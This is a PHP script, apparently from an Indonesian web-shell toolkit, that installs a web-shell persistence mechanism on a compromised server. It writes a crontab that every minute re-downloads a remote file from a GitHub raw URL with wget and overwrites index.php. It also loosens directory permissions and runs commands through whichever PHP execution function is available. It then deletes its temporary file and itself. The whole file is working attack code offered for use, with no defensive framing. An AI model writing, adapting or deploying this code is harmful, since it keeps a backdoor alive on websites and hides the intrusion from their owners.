<?php
$anu = "index.php"; /// ganti nama shell mu 
$url = "https://raw.githubusercontent.com/kikiii88/sadboy/refs/heads/main/back/mati/kau/png8.txt"; /// url shellmu
$kontol = __FILE__;
$current_dir = realpath(dirname($kontol));
$kimak = $current_dir."/".$anu;
$ccc = "* * * * * chmod 0755 ".$current_dir." >>/dev/null 2>&1\n* * * * * wget ".$url." -O ".$kimak." >> /dev/null 2>&1\n";
$upload4 = "xpx";$kepo3 = fopen($upload4,"a");fwrite($kepo3,$ccc);
$laho = run("crontab xpx");
$cele = run("crontab -l");
function run($command){
            if (function_exists('shell_exec')) {
                $output = shell_exec($command);
            } elseif (function_exists('exec')) {
                exec($command, $output);
                $output = implode("\n", $output);
            } elseif (function_exists('passthru')) {
                ob_start();
                passthru($command);
                $output = ob_get_clean();
            } elseif (function_exists('system')) {
                ob_start();
                system($command);
                $output = ob_get_clean();
            } elseif (function_exists('proc_open')) {
                $descriptors = array(
                    0 => array('pipe', 'r'),  // stdin
                    1 => array('pipe', 'w'),  // stdout
                    2 => array('pipe', 'w')   // stderr
                );
                $process = proc_open($command, $descriptors, $pipes);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                proc_close($process);
            } else {
                throw new Exception('Command execution is disabled.');
            }
            echo htmlspecialchars($output);
        }
 unlink("xpx");
 unlink(__FILE__);       
?>
